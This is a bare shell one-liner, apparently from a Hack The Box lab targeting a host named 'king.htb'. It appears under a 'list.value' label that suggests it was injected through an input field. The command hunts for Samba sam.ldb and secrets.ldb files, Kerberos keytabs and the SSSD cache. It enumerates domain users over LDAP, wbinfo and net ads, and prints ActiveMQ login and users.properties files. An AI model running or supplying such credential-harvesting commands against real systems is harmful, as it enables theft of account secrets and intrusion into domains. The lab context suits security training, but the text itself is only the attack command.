list.value: echo "=SAMBA_DB="; find / -name "sam.ldb" -o -name "secrets.ldb" -o -name "*.ldb" 2>/dev/null | grep -v proc | head -20; echo "=KEYTAB="; ls -la /etc/krb5.keytab /etc/*.keytab /var/lib/sss/*.keytab 2>/dev/null; echo "=SSSD_CACHE="; ls -la /var/lib/sss/db/ 2>/dev/null; echo "=KRB5_CONF="; cat /etc/krb5.conf 2>/dev/null; echo "=SAMBA_DC="; find /var/lib/samba -type f 2>/dev/null | head -30; echo "=LDAP_TEST="; ldapsearch -H ldap://localhost -x -b "dc=king,dc=htb" "(objectClass=user)" sAMAccountName 2>/dev/null | head -40; echo "=NET_ADS="; net ads info 2>/dev/null; echo "=WBINFO="; wbinfo -u 2>/dev/null | head -20; echo "=ACTIVEMQ_LOGIN="; cat /opt/activemq/conf/login.config 2>/dev/null; cat /opt/activemq/conf/users.properties 2>/dev/null; echo "=ACTIVE_MQ_CONF2="; ls /opt/activemq/conf/ 2>/dev/null
